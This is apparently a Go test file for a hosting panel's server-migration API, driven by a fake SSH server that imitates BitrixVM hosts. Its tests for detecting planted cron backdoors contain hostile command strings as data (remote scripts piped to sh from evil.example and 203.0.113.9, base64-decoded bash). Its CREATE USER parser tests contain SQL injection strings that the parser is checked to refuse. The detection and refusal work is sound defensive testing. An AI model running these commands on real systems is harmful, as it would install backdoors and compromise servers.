package api

import (
	"archive/tar"
	"bytes"
	"crypto/ed25519"
	"crypto/rand"
	"database/sql"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"path"
	"path/filepath"
	"strings"
	"sync"
	"testing"

	"golang.org/x/crypto/ssh"

	"monopanel/internal/agent"
	"monopanel/internal/agent/agenttest"
	"monopanel/internal/store"
)

// fakeSSH is an ssh server that answers exec requests from a scripted
// filesystem: cat, test -e/-L, ls -1d and whatever the test adds by prefix.
// It is what a BitrixVM or a FASTPANEL server looks like to the adapters.
type fakeSSH struct {
	t        *testing.T
	addr     string
	password string
	files    map[string]string
	dirs     map[string]bool
	links    map[string]bool
	// answers maps a command prefix to its stdout (exit 0).
	answers map[string]string
	// handler answers anything else; nil means "command not found".
	handler func(cmd string) (string, int)

	mu   sync.Mutex
	cmds []string
}

func newFakeSSH(t *testing.T) *fakeSSH {
	t.Helper()
	f := &fakeSSH{t: t, password: "root-secret", files: map[string]string{}, dirs: map[string]bool{}, links: map[string]bool{}, answers: map[string]string{}}
	_, priv, err := ed25519.GenerateKey(rand.Reader)
	if err != nil {
		t.Fatal(err)
	}
	signer, err := ssh.NewSignerFromKey(priv)
	if err != nil {
		t.Fatal(err)
	}
	cfg := &ssh.ServerConfig{PasswordCallback: func(c ssh.ConnMetadata, pw []byte) (*ssh.Permissions, error) {
		if c.User() == "root" && string(pw) == f.password {
			return nil, nil
		}
		return nil, fmt.Errorf("denied")
	}}
	cfg.AddHostKey(signer)
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	f.addr = ln.Addr().String()
	t.Cleanup(func() { ln.Close() })
	go func() {
		for {
			conn, err := ln.Accept()
			if err != nil {
				return
			}
			go f.serve(conn, cfg)
		}
	}()
	return f
}

func (f *fakeSSH) serve(nc net.Conn, cfg *ssh.ServerConfig) {
	conn, chans, reqs, err := ssh.NewServerConn(nc, cfg)
	if err != nil {
		return
	}
	defer conn.Close()
	go ssh.DiscardRequests(reqs)
	for ch := range chans {
		if ch.ChannelType() != "session" {
			ch.Reject(ssh.UnknownChannelType, "no") //nolint:errcheck // тест
			continue
		}
		channel, requests, err := ch.Accept()
		if err != nil {
			continue
		}
		go func() {
			defer channel.Close()
			for req := range requests {
				if req.Type != "exec" {
					req.Reply(false, nil) //nolint:errcheck // тест
					continue
				}
				var payload struct{ Command string }
				ssh.Unmarshal(req.Payload, &payload) //nolint:errcheck // тест
				req.Reply(true, nil)                 //nolint:errcheck // тест
				out, code := f.run(payload.Command)
				io.WriteString(channel, out) //nolint:errcheck // тест
				if code != 0 {
					io.WriteString(channel.Stderr(), "fake: exit "+fmt.Sprint(code)) //nolint:errcheck // тест
				}
				status := make([]byte, 4)
				binary.BigEndian.PutUint32(status, uint32(code))
				channel.SendRequest("exit-status", false, status) //nolint:errcheck // тест
				return
			}
		}()
	}
}

func unq(s string) string {
	s = strings.TrimSpace(s)
	if strings.HasPrefix(s, "'") && strings.HasSuffix(s, "'") && len(s) >= 2 {
		return strings.ReplaceAll(s[1:len(s)-1], `'\''`, "'")
	}
	return s
}

func (f *fakeSSH) run(cmd string) (string, int) {
	f.mu.Lock()
	f.cmds = append(f.cmds, cmd)
	f.mu.Unlock()
	switch {
	case strings.HasPrefix(cmd, "cat "):
		p := unq(strings.TrimPrefix(cmd, "cat "))
		if c, ok := f.files[p]; ok {
			return c, 0
		}
		return "", 1
	case strings.HasPrefix(cmd, "test -e "):
		p := unq(strings.TrimPrefix(cmd, "test -e "))
		if _, ok := f.files[p]; ok || f.dirs[p] || f.links[p] {
			return "", 0
		}
		return "", 1
	case strings.HasPrefix(cmd, "test -L "):
		if f.links[unq(strings.TrimPrefix(cmd, "test -L "))] {
			return "", 0
		}
		return "", 1
	case strings.HasPrefix(cmd, "ls -1d "):
		pattern := strings.TrimSuffix(strings.TrimPrefix(cmd, "ls -1d "), " 2>/dev/null")
		var out []string
		for p := range f.files {
			if ok, _ := path.Match(pattern, p); ok {
				out = append(out, p)
			}
		}
		sortStrings(out)
		return strings.Join(out, "\n") + "\n", 0
	}
	for prefix, out := range f.answers {
		if strings.HasPrefix(cmd, prefix) {
			return out, 0
		}
	}
	if f.handler != nil {
		return f.handler(cmd)
	}
	return "", 127
}

func (f *fakeSSH) commands() []string {
	f.mu.Lock()
	defer f.mu.Unlock()
	return append([]string(nil), f.cmds...)
}

func (f *fakeSSH) command(prefix string) string {
	for _, c := range f.commands() {
		if strings.HasPrefix(c, prefix) {
			return c
		}
	}
	return ""
}

func hasNote(notes []string, part string) bool {
	for _, n := range notes {
		if strings.Contains(n, part) {
			return true
		}
	}
	return false
}

func sortStrings(s []string) {
	for i := range s {
		for j := i + 1; j < len(s); j++ {
			if s[j] < s[i] {
				s[i], s[j] = s[j], s[i]
			}
		}
	}
}

// tarOf builds a tar stream with one file per entry (dir entries end in /).
func tarOf(t *testing.T, entries map[string]string) string {
	t.Helper()
	var buf bytes.Buffer
	tw := tar.NewWriter(&buf)
	for name, content := range entries {
		h := &tar.Header{Name: name, Mode: 0o644, Size: int64(len(content))}
		if strings.HasSuffix(name, "/") {
			h.Typeflag, h.Mode, h.Size = tar.TypeDir, 0o755, 0
		}
		if err := tw.WriteHeader(h); err != nil {
			t.Fatal(err)
		}
		if h.Typeflag != tar.TypeDir {
			tw.Write([]byte(content)) //nolint:errcheck // тест
		}
	}
	tw.Close()
	return buf.String()
}

// tarWithSymlink appends a symlink member to an archive tarOf built.
func tarWithSymlink(t *testing.T, archive, name, target string) string {
	t.Helper()
	var buf bytes.Buffer
	tw := tar.NewWriter(&buf)
	tr := tar.NewReader(strings.NewReader(archive))
	for {
		h, err := tr.Next()
		if err == io.EOF {
			break
		}
		if err != nil {
			t.Fatal(err)
		}
		if err := tw.WriteHeader(h); err != nil {
			t.Fatal(err)
		}
		io.Copy(tw, tr) //nolint:errcheck // тест
	}
	if err := tw.WriteHeader(&tar.Header{Name: name, Typeflag: tar.TypeSymlink, Linkname: target, Mode: 0o777}); err != nil {
		t.Fatal(err)
	}
	tw.Close()
	return buf.String()
}

// tarSymlinks reads the symlinks of the archives tar -x got here.
func tarSymlinks(t *testing.T, streams []agenttest.Stream) map[string]string {
	t.Helper()
	links := map[string]string{}
	for _, st := range streams {
		if st.Direction != "in" || st.Name != "tar" {
			continue
		}
		tr := tar.NewReader(bytes.NewReader(st.Head))
		for {
			h, err := tr.Next()
			if err != nil {
				break
			}
			if h.Typeflag == tar.TypeSymlink {
				links[path.Clean(h.Name)] = h.Linkname
			}
		}
	}
	return links
}

// mysqlAnswers gives the old server's MySQL the answers information_schema
// and mysql.user would give.
func mysqlAnswers(f *fakeSSH, size string) {
	f.answers["mysql -N -B -e 'SELECT 1'"] = "1\n"
	f.handler = func(cmd string) (string, int) {
		switch {
		case strings.Contains(cmd, "information_schema.SCHEMATA"):
			return "utf8mb4\tutf8mb4_unicode_ci\n", 0
		case strings.Contains(cmd, "information_schema.TABLES"):
			return size + "\n", 0
		case strings.Contains(cmd, "FROM mysql.user"):
			return "localhost\tmysql_native_password\n", 0
		case strings.Contains(cmd, "SHOW CREATE USER"):
			return "CREATE USER 'shop_u'@'localhost' IDENTIFIED WITH 'mysql_native_password' AS '*94BDCEBE19083CE2A1F959FD02F964C7AF4CFC29' REQUIRE NONE PASSWORD EXPIRE DEFAULT ACCOUNT UNLOCK\n", 0
		case strings.HasPrefix(cmd, "mysqldump "):
			return "-- dump\nCREATE DATABASE IF NOT EXISTS `sitemanager`;\nUSE `sitemanager`;\nCREATE TABLE t (id int);\n", 0
		case strings.HasPrefix(cmd, "du -sb "):
			return "4096\t" + unq(strings.TrimSuffix(strings.TrimPrefix(cmd, "du -sb "), " 2>/dev/null")) + "\n", 0
		}
		return "", 127
	}
}

func TestParseSSHTarget(t *testing.T) {
	for in, want := range map[string]sshTarget{
		"old.example.com":             {user: "root", host: "old.example.com", port: "22"},
		"admin@old.example.com:2222":  {user: "admin", host: "old.example.com", port: "2222"},
		"ssh://root@[2001:db8::1]:22": {user: "root", host: "2001:db8::1", port: "22"},
	} {
		got, err := parseSSHTarget(in)
		if err != nil || got != want {
			t.Errorf("%s → %+v, %v; ожидалось %+v", in, got, err, want)
		}
	}
	if _, err := parseSSHTarget("root@"); err == nil {
		t.Error("пустой хост должен быть ошибкой")
	}
}

func TestForeignHelpers(t *testing.T) {
	root, names, cert, key := parseNginxServer("server {\n  listen 443 ssl; # root /wrong;\n  server_name shop.example.com www.shop.example.com;\n  server_name alias.example.com;\n  root /home/bitrix/ext_www/shop.example.com;\n  ssl_certificate /etc/nginx/certs/a.crt;\n  ssl_certificate_key /etc/nginx/certs/a.key;\n}\n")
	if root != "/home/bitrix/ext_www/shop.example.com" || strings.Join(names, ",") != "shop.example.com,www.shop.example.com,alias.example.com" || cert != "/etc/nginx/certs/a.crt" || key != "/etc/nginx/certs/a.key" {
		t.Errorf("nginx: %s %v %s %s", root, names, cert, key)
	}
	root, _, cert, key = parseNginxServer("server {\n  root \"/home/bitrix/ext_www/gulmart.kz\";\n  ssl_certificate '/etc/nginx/ssl/my cert.pem';\n  ssl_certificate_key \"/etc/nginx/ssl/key.pem\";\n}\n")
	if root != "/home/bitrix/ext_www/gulmart.kz" || cert != "/etc/nginx/ssl/my cert.pem" || key != "/etc/nginx/ssl/key.pem" {
		t.Errorf("nginx в кавычках: %s %s %s", root, cert, key)
	}
	main, aliases := hostDomains([]string{"www.shop.example.com", "shop.example.com", "_", "alias.example.com", "www.shop.example.com"})
	if main != "shop.example.com" || strings.Join(aliases, ",") != "alias.example.com" {
		t.Errorf("hostDomains: %s %v", main, aliases)
	}
	maria, err := parseCreateUser("CREATE USER 'a'@'localhost' IDENTIFIED BY PASSWORD '*94BDCEBE19083CE2A1F959FD02F964C7AF4CFC29'")
	if err != nil || maria.clause(false) != "IDENTIFIED WITH mysql_native_password AS '*94BDCEBE19083CE2A1F959FD02F964C7AF4CFC29'" {
		t.Errorf("mariadb: %+v %v", maria, err)
	}
	f := &foreignSource{rewrites: [][2]string{{"/home/bitrix/www/", "/var/www/bitrix/data/www/main.example.com/"}, {"/home/bitrix/", "/var/www/bitrix/"}}}
	jobs := f.parseCrontab("PATH=/usr/bin\n# agents\n*/5 * * * * /usr/bin/php -f /home/bitrix/www/bitrix/modules/main/tools/cron_events.php\n@daily rm -rf /home/bitrix/.bx_temp/*\n")
	if len(jobs) != 2 || jobs[0].Command != "/usr/bin/php -f /var/www/bitrix/data/www/main.example.com/bitrix/modules/main/tools/cron_events.php" || jobs[0].Comment != "agents" || jobs[1].Schedule != "@daily" || jobs[1].Command != "rm -rf /var/www/bitrix/.bx_temp/*" {
		t.Errorf("crontab: %+v %+v", jobs[0], jobs[1])
	}
	// System crontabs name the user between the schedule and the command.
	sys := systemCronEntries("SHELL=/bin/bash\nMAILTO=root\n# выгрузка\n0 3 * * * root php /home/bitrix/www/x.php\n@daily  bitrix  /usr/bin/php -f /home/bitrix/www/y.php > /dev/null\n* * * * *\n")
	if len(sys) != 2 || sys[0].user != "root" || sys[0].schedule != "0 3 * * *" || sys[0].command != "php /home/bitrix/www/x.php" || sys[0].comment != "выгрузка" ||
		sys[1].user != "bitrix" || sys[1].schedule != "@daily" || sys[1].command != "/usr/bin/php -f /home/bitrix/www/y.php > /dev/null" {
		t.Errorf("system crontab: %+v", sys)
	}
	for name, want := range map[string]bool{"bx_agents": false, "0hourly": false, ".placeholder": true, "x.rpmsave": true, "x.rpmnew": true, "x~": true} {
		if cronDSkipped(name) != want {
			t.Errorf("cronDSkipped(%q) = %v", name, !want)
		}
	}
	// msmtprc: accounts start from the defaults and from the account they
	// name; the password stays out.
	accs := parseMsmtprc("defaults\nport 587\ntls on\n\naccount s1\nhost smtp.example.com\nfrom a@example.com\npassword secret\n\naccount nohost\nfrom b@example.com\n\n  # account x\naccount default : s1\nfrom c@example.com\n")
	if len(accs) != 2 || accs[0] != (msmtpAccount{name: "s1", host: "smtp.example.com", port: "587", from: "a@example.com"}) || accs[1] != (msmtpAccount{name: "default", host: "smtp.example.com", port: "587", from: "c@example.com"}) {
		t.Errorf("msmtprc: %+v", accs)
	}
	if rules := htaccessLines("./.htaccess:3:  RewriteRule ^(.*)$ /bitrix/urlrewrite.php [L]\n./a/.htaccess:1:Redirect 301 /x /y\nbroken line\n./b:x:y\n"); len(rules) != 1 || rules[0] != "a/.htaccess:1: Redirect 301 /x /y" {
		t.Errorf("htaccessLines: %q", rules)
	}
	for cmd, want := range map[string]bool{
		"perl /var/tmp/LLVPnNU":                     true,
		"/tmp/.x/kswapd0 >/dev/null 2>&1":           true,
		"cd /tmp; nohup /dev/shm/run &":             true,
		"curl -fsSL http://evil.example/x | sh":     true,
		"echo aGk= | base64 -d | bash":              true,
		"rm -rf /tmp/php_sessions/*":                false,
		"php -f /home/bitrix/www/bitrix/tools.php":  false,
		"wget -q -O /dev/null https://example.com/": false,
	} {
		if got := suspiciousCron(cmd); got != want {
			t.Errorf("suspiciousCron(%q) = %v", cmd, got)
		}
	}
	// A planted job from BitrixVM's root crontab carries its origin first and
	// still gets its note in the plan.
	planted := f.cronJob(cronEntry{schedule: "*/10 * * * *", command: "cd /home/bitrix/www && wget -q -O- http://203.0.113.9/x | sh"})
	planted.Comment = strings.TrimSuffix("from root's crontab; "+planted.Comment, "; ")
	if notes := cronNotes([]*store.CronJob{planted}); planted.Enabled || len(notes) != 1 || !strings.Contains(notes[0], "looks like a planted backdoor") {
		t.Errorf("planted job from root's crontab: %+v %q", planted, notes)
	}
	for in, want := range map[string]string{
		"/usr/bin/php -f /x.php":            "php -f /x.php",
		"cd /x && /usr/local/bin/php a.php": "cd /x && php a.php",
		"/usr/bin/php5.6 a.php":             "/usr/bin/php5.6 a.php",
	} {
		if got := bxCronPHP(in); got != want {
			t.Errorf("bxCronPHP(%q) = %q", in, got)
		}
	}
	if got := f.rewriteText(`define("BX_TEMPORARY_FILES_DIRECTORY", "/home/bitrix/.bx_temp/sitemanager");`); !strings.Contains(got, `"/var/www/bitrix/.bx_temp/sitemanager"`) {
		t.Errorf("rewriteText: %s", got)
	}
	if got := f.rewriteText(`'root' => '/home/bitrix/www',`); !strings.Contains(got, `'/var/www/bitrix/data/www/main.example.com'`) {
		t.Errorf("rewriteText exact: %s", got)
	}
}

// The CREATE USER of a source is taken apart, never replayed: a plain
// password gets its plugin named (the server default would lock PHP below 7.4
// out), a hash keeps its plugin, and whatever else the statement says stays
// out of what runs as root here.
func TestParseCreateUser(t *testing.T) {
	plain, err := parseCreateUser("CREATE USER IF NOT EXISTS 'a'@'localhost' IDENTIFIED BY 'p''w'")
	if err != nil || plain.plain != "p'w" {
		t.Fatalf("plain: %+v %v", plain, err)
	}
	// The quote is doubled, not backslashed: with NO_BACKSLASH_ESCAPES in the
	// server's sql_mode \' would end the literal.
	if got := plain.clause(true); got != `IDENTIFIED WITH mysql_native_password BY 'p''w'` || plain.effectivePlugin(true) != "mysql_native_password" {
		t.Errorf("legacy: %s", got)
	}
	if got := plain.clause(false); got != `IDENTIFIED WITH caching_sha2_password BY 'p''w'` || plain.effectivePlugin(false) != "caching_sha2_password" {
		t.Errorf("modern: %s", got)
	}
	tricky, err := parseCreateUser(`CREATE USER 'a'@'localhost' IDENTIFIED BY 'x\\''; GRANT ALL ON *.* TO a; -- '`)
	if err != nil || tricky.plain != `x\'; GRANT ALL ON *.* TO a; -- ` || tricky.clause(false) != `IDENTIFIED WITH caching_sha2_password BY 'x\\''; GRANT ALL ON *.* TO a; -- '` {
		t.Errorf("a password with a backslash and a quote: %+v %v -> %s", tricky, err, tricky.clause(false))
	}
	native, err := parseCreateUser("CREATE USER 'a'@'localhost' IDENTIFIED WITH 'mysql_native_password' AS '*94bdcebe19083ce2a1f959fd02f964c7af4cfc29' REQUIRE NONE PASSWORD EXPIRE DEFAULT ACCOUNT UNLOCK")
	if err != nil || native.clause(false) != "IDENTIFIED WITH mysql_native_password AS '*94BDCEBE19083CE2A1F959FD02F964C7AF4CFC29'" || native.effectivePlugin(false) != "mysql_native_password" {
		t.Errorf("native: %+v %v", native, err)
	}
	via, err := parseCreateUser("CREATE USER `a`@`localhost` IDENTIFIED VIA mysql_native_password USING '*94BDCEBE19083CE2A1F959FD02F964C7AF4CFC29'")
	if err != nil || via.plugin != "mysql_native_password" {
		t.Errorf("mariadb via: %+v %v", via, err)
	}
	// caching_sha2_password: a binary salt, printed as a hex literal by the
	// source and written back as one here.
	hash := append([]byte("$A$005$"), []byte{1, '\'', 2, '\\', 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18}...)
	hash = append(hash, []byte(strings.Repeat("aB3./", 8)+"xyz")...)
	sha2, err := parseCreateUser(fmt.Sprintf("CREATE USER `a`@`localhost` IDENTIFIED WITH 'caching_sha2_password' AS 0x%X REQUIRE NONE PASSWORD EXPIRE DEFAULT ACCOUNT LOCK", hash))
	if err != nil || sha2.clause(false) != fmt.Sprintf("IDENTIFIED WITH caching_sha2_password AS 0x%X ACCOUNT LOCK", hash) {
		t.Errorf("caching_sha2: %+v %v", sha2, err)
	}
	// What a statement adds after the password never runs.
	inj, err := parseCreateUser("CREATE USER 'a'@'localhost' IDENTIFIED BY 'x'; GRANT ALL ON *.* TO 'a'@'localhost' WITH GRANT OPTION")
	if err != nil || strings.Contains(inj.clause(false), "GRANT") {
		t.Errorf("trailing statement: %+v %v", inj, err)
	}
	for _, bad := range []string{
		"CREATE USER 'a'@'localhost' IDENTIFIED WITH 'sha256_password' AS '$5$abc'",
		"CREATE USER 'a'@'localhost' IDENTIFIED WITH 'mysql_native_password' AS '*94BD'' OR ''1'",
		"CREATE USER 'a'@'localhost' IDENTIFIED WITH 'mysql_native_password' AS ''",
		"CREATE USER 'a'@'localhost' IDENTIFIED WITH 'caching_sha2_password' AS '$A$005$short'",
		"CREATE USER 'a'@'localhost' IDENTIFIED BY ''",
		"CREATE USER 'a'@'localhost' IDENTIFIED BY 'line\nbreak'",
		"CREATE USER 'a'@'localhost' IDENTIFIED BY 'unterminated",
		"ALTER USER 'root'@'localhost' ACCOUNT UNLOCK",
		"DROP DATABASE victim",
	} {
		if a, err := parseCreateUser(bad); err == nil {
			t.Errorf("%q must be refused, got %+v", bad, a)
		}
	}
	if v := legacyPHP([]*store.Site{{PHPVersion: "8.3"}, {PHPVersion: "7.0"}, {PHPVersion: "5.6"}, {}}); v != "5.6" {
		t.Errorf("legacyPHP: %q", v)
	}
	if v := legacyPHP([]*store.Site{{PHPVersion: "7.4"}}); v != "" {
		t.Errorf("legacyPHP 7.4: %q", v)
	}
}

// The BitrixVM machine: a main site with server_name _, a link site that
// shares its kernel, the database settings in .settings.php and a crontab
// full of old paths. Everything must land here under one account with the
// paths rewritten and the database recreated with its plain password.
func TestMigrationFromBitrixVM(t *testing.T) {
	fakeUnixAccounts(t)
	remote := newFakeSSH(t)
	remote.dirs["/etc/nginx/bx"] = true
	remote.dirs["/home/bitrix"] = true
	remote.dirs["/home/bitrix/www/bitrix"] = true
	remote.dirs["/home/bitrix/www/bitrix/modules/main/classes"] = true
	remote.links["/home/bitrix/ext_www/shop.example.com/bitrix"] = true
	remote.dirs["/home/bitrix/ext_www/shop.example.com/bitrix"] = true
	remote.files["/etc/nginx/bx/site_enabled/s1.conf"] = "server {\n listen 80 default_server;\n server_name _;\n root /home/bitrix/www;\n}\n"
	remote.files["/etc/nginx/bx/site_enabled/bx_ext_shop.example.com.conf"] = "server {\n listen 80;\n server_name shop.example.com www.shop.example.com;\n root \"/home/bitrix/ext_www/shop.example.com\";\n}\n"
	remote.files["/etc/nginx/bx/site_enabled/bx_ext_other.conf"] = "server {\n listen 80;\n server_name other.example.com;\n root /var/www/other;\n}\n"
	remote.files["/etc/nginx/bx/site_enabled/rtc.conf"] = "server {\n listen 8893;\n server_name _;\n}\n"
	settings := "<?php\nreturn array(\n 'connections' => array('value' => array('default' => array(\n  'className' => '\\\\Bitrix\\\\Main\\\\DB\\\\MysqliConnection',\n  'host' => 'localhost',\n  'database' => 'sitemanager',\n  'login' => 'shop_u',\n  'password' => 'pl4in-P@ss',\n ))),\n);\n"
	remote.files["/home/bitrix/www/bitrix/.settings.php"] = settings + "// 'cache' => array('value' => array('type' => array('class_name' => 'CPHPCacheMemcacheCluster', 'extension' => 'memcache')))\n"
	remote.files["/home/bitrix/ext_www/shop.example.com/bitrix/.settings.php"] = settings
	remote.answers["php -r"] = "8.4"
	remote.answers["getent passwd 'bitrix'"] = "bitrix:x:600:600::/home/bitrix:/bin/bash\n"
	remote.answers["getent shadow 'bitrix'"] = "bitrix:$6$salt$bitrixhash:19000::::::\n"
	remote.answers["hostname"] = "vm.bitrix.local\n"
	remote.answers["rpm -q"] = "9.0.8"
	remote.answers["crontab -l -u 'bitrix'"] = "*/5 * * * * /usr/bin/php -f /home/bitrix/www/bitrix/modules/main/tools/cron_events.php\n*/5 * * * * perl /var/tmp/LLVPnNU\n"
	remote.answers["crontab -l -u root"] = "# экспорт\n0 3 * * * php /home/bitrix/www/export/export-csv.php\n*/5 * * * * /usr/bin/php -f /home/bitrix/www/bitrix/modules/main/tools/cron_events.php\n@daily /opt/webdir/bin/bx-backup\n"
	remote.answers["cd '/home/bitrix/www' && { find "] = "./export/export-csv.php\n"
	// grep over the site's .htaccess files: Bitrix's stock lines and the
	// site's own rules.
	remote.answers["cd '/home/bitrix/www' && find . "] = "./.htaccess:2:ErrorDocument 404 /404.php\n" +
		"./.htaccess:5:  php_flag session.use_trans_sid off\n" +
		"./.htaccess:7:Redirect 301 /old-catalog/ /catalog/\n" +
		"./.htaccess:14:  RewriteCond %{REQUEST_FILENAME} !-f\n" +
		"./.htaccess:16:  RewriteCond %{REQUEST_FILENAME} !-d\n" +
		"./.htaccess:17:  RewriteCond %{REQUEST_FILENAME} !/bitrix/urlrewrite.php$\n" +
		"./.htaccess:18:  RewriteRule ^(.*)$ /bitrix/urlrewrite.php [L]\n" +
		"./.htaccess:19:  RewriteRule .* - [E=REMOTE_USER:%{HTTP:Authorization}]\n" +
		"./catalog/.htaccess:2:RewriteRule ^item-([0-9]+)$ detail.php?id=$1 [L]\n" +
		"./catalog/.htaccess:3:php_value memory_limit 512M\n"
	// The system crontabs: a job of bitrix, root's job on the site, the
	// system's own maintenance, a planted line of another user and a file
	// cron passes by.
	remote.files["/etc/crontab"] = "SHELL=/bin/bash\nPATH=/sbin:/bin:/usr/sbin:/usr/bin\nMAILTO=root\n\n# резервная копия\n*/10 * * * * bitrix php -f /home/bitrix/www/bitrix/tools/backup.php\n"
	remote.files["/etc/cron.d/0hourly"] = "01 * * * * root run-parts /etc/cron.hourly\n"
	remote.files["/etc/cron.d/bx_sitemap"] = "# карта сайта\n30 4 * * * root /usr/bin/php /home/bitrix/www/sitemap.php\n*/2 * * * * nobody curl -s http://203.0.113.9/y | sh\n"
	remote.files["/etc/cron.d/bx_old.rpmsave"] = "0 0 * * * root php /home/bitrix/www/never.php\n"
	// msmtp of BitrixVM: the relay is named in the plan, its password never.
	remote.files["/home/bitrix/.msmtprc"] = "# smtp account configuration for default\naccount default\nlogfile /home/bitrix/msmtp_default.log\nhost smtp.example.com\nport 587\nfrom shop@example.com\nauth on\nuser shop@example.com\npassword s3cr3t-relay\n"
	mysqlAnswers(remote, "2048")
	inner := remote.handler
	// The link site's bitrix/ is an absolute symlink into the main site; tar
	// on the source rewrote its target to the home here (flag R).
	var coreLink string
	remote.handler = func(cmd string) (string, int) {
		if strings.HasPrefix(cmd, "tar -C '/home/bitrix'") {
			archive := tarOf(t, map[string]string{"data/www/main.example.com/": "", "data/www/main.example.com/index.php": "<?php\n", "data/www/main.example.com/bitrix/": ""})
			return tarWithSymlink(t, archive, "data/www/shop.example.com/bitrix", coreLink), 0
		}
		return inner(cmd)
	}

	target := newSiteFixture(t)
	coreLink = target.s.cfg.WWWRoot + "/bitrix/data/www/main.example.com/bitrix"
	target.installDB()
	var mysqlSQL []string
	target.agent.ToolHook = func(req agent.ToolRequest) *agent.ToolResponse {
		if req.Name == "mysql" {
			mysqlSQL = append(mysqlSQL, req.Stdin)
		}
		return nil
	}
	// fsop read/write as the client: dbconn.php with the old temp path.
	written := map[string]string{}
	target.agent.RunAsHook = func(req agent.RunAsUserRequest) *agent.RunAsUserResponse {
		if len(req.Args) == 2 && req.Args[0] == "read" && req.Args[1] == "data/www/main.example.com/bitrix/php_interface/dbconn.php" {
			return &agent.RunAsUserResponse{StdoutBase64: base64.StdEncoding.EncodeToString([]byte(`define("BX_TEMPORARY_FILES_DIRECTORY", "/home/bitrix/.bx_temp/sitemanager");`))}
		}
		if len(req.Args) == 2 && req.Args[0] == "read" && req.Args[1] == "data/www/main.example.com/export/export-csv.php" {
			return &agent.RunAsUserResponse{StdoutBase64: base64.StdEncoding.EncodeToString([]byte(`<? $f = fopen("/home/bitrix/www/export/export.csv", "w");`))}
		}
		if len(req.Args) == 2 && req.Args[0] == "write" {
			raw, _ := base64.StdEncoding.DecodeString(req.StdinBase64)
			written[req.Args[1]] = string(raw)
			return &agent.RunAsUserResponse{}
		}
		if len(req.Args) == 2 && req.Args[0] == "read" {
			return &agent.RunAsUserResponse{ExitCode: 1, Stderr: "no such file"}
		}
		return nil
	}

	body := map[string]any{"panel": "bitrixvm", "source": "root@" + remote.addr, "password": remote.password}
	var noDomain struct {
		Title  string `json:"title"`
		Detail string `json:"detail"`
	}
	target.call(http.MethodPost, "/migrate/plan", body, http.StatusBadGateway, &noDomain)
	if !strings.Contains(noDomain.Detail, "--domain") {
		t.Errorf("без --domain основной сайт не назвать: %+v", noDomain)
	}
	body["domain"] = "main.example.com"
	var plan struct {
		Login  string `json:"login"`
		OK     bool   `json:"ok"`
		Bundle struct {
			Panel  string `json:"panel"`
			Family string `json:"family"`
			Sites  []struct {
				Domain, Preset string
				PHPVersion     string `json:"php_version"`
			}
			Databases []struct {
				Name  string `json:"name"`
				Users []struct{ Name, Host string }
			}
			Cron    []struct{ Command string }
			Notes   []string
			Secrets any
			Sizes   struct {
				FilesBytes int64            `json:"files_bytes"`
				Databases  map[string]int64 `json:"databases"`
			}
		} `json:"bundle"`
		Conflicts []struct{ Text string }
	}
	target.call(http.MethodPost, "/migrate/plan", body, http.StatusOK, &plan)
	if !plan.OK || plan.Login != "bitrix" {
		t.Fatalf("разбор: %+v", plan)
	}
	b := plan.Bundle
	if b.Panel != "BitrixVM 9.0.8" || b.Family != "rhel" || len(b.Sites) != 2 || b.Sites[0].Domain != "main.example.com" || b.Sites[1].Domain != "shop.example.com" {
		t.Fatalf("сайты: %s %s %+v", b.Panel, b.Family, b.Sites)
	}
	if !hasNote(b.Notes, "bx_ext_other.conf skipped: root /var/www/other is outside /home/bitrix") {
		t.Errorf("пропущенный сайт не упомянут: %q", b.Notes)
	}
	if b.Sites[0].Preset != "bitrix" || b.Sites[0].PHPVersion != "8.4" {
		t.Errorf("пресет/PHP: %+v", b.Sites[0])
	}
	if len(b.Databases) != 1 || b.Databases[0].Name != "sitemanager" || len(b.Databases[0].Users) != 1 || b.Databases[0].Users[0].Host != "localhost" {
		t.Errorf("базы: %+v", b.Databases)
	}
	mainDir := target.s.cfg.WWWRoot + "/bitrix/data/www/main.example.com"
	if len(b.Cron) != 5 || b.Cron[0].Command != "php -f "+mainDir+"/bitrix/modules/main/tools/cron_events.php" || b.Cron[2].Command != "php "+mainDir+"/export/export-csv.php" ||
		b.Cron[3].Command != "php -f "+mainDir+"/bitrix/tools/backup.php" || b.Cron[4].Command != "php "+mainDir+"/sitemap.php" {
		t.Errorf("cron не переписан: %+v", b.Cron)
	}
	for _, want := range []string{
		"cron jobs moved from root's crontab: 1", "@daily /opt/webdir/bin/bx-backup", `perl /var/tmp/LLVPnNU" looks like a planted backdoor`, "the Bitrix cache is CPHPCacheMemcacheCluster", "it will be rewritten to the new path:\n    /home/bitrix/www/export/export-csv.php",
		"cron jobs moved from /etc/crontab and /etc/cron.d: 2", "/etc/crontab (bitrix): */10 * * * * php -f " + mainDir + "/bitrix/tools/backup.php", "/etc/cron.d/bx_sitemap (root): 30 4 * * * php " + mainDir + "/sitemap.php",
		`/etc/cron.d/bx_sitemap: the job "*/2 * * * * curl -s http://203.0.113.9/y | sh" of nobody looks like a planted backdoor`,
		"site main.example.com: Apache on the source ran these .htaccess rules", "mp site nginx main.example.com --set <file>",
		"\n    .htaccess:7: Redirect 301 /old-catalog/ /catalog/\n    catalog/.htaccess:2: RewriteRule ^item-([0-9]+)$ detail.php?id=$1 [L]\n    catalog/.htaccess:3: php_value memory_limit 512M",
		"/home/bitrix/.msmtprc (account default): smtp.example.com:587, from shop@example.com", "mail() of the sites goes to /usr/sbin/sendmail",
		"mp site set main.example.com --default-tls",
	} {
		if !hasNote(b.Notes, want) {
			t.Errorf("в разборе нет %q: %q", want, b.Notes)
		}
	}
	for _, unwanted := range []string{"/bitrix/urlrewrite.php [L]", "REMOTE_USER", "ErrorDocument 404 /404.php", "use_trans_sid", "never.php", "run-parts", "s3cr3t-relay", "msmtp of the BitrixVM"} {
		if hasNote(b.Notes, unwanted) {
			t.Errorf("в разборе лишнее %q: %q", unwanted, b.Notes)
		}
	}
	if b.Secrets != nil {
		t.Error("разбор не должен нести секреты")
	}
	if b.Sizes.FilesBytes != 8192 || b.Sizes.Databases["sitemanager"] != 2048 {
		t.Errorf("размеры: %+v", b.Sizes)
	}
	for _, c := range remote.commands() {
		if strings.Contains(c, "pl4in-P@ss") {
			t.Errorf("пароль базы попал в команду источника: %s", c)
		}
	}

	var ref struct {
		JobID int64 `json:"job_id"`
	}
	target.call(http.MethodPost, "/migrate/run", body, http.StatusAccepted, &ref)
	// The job payload must not carry the ssh password in the open.
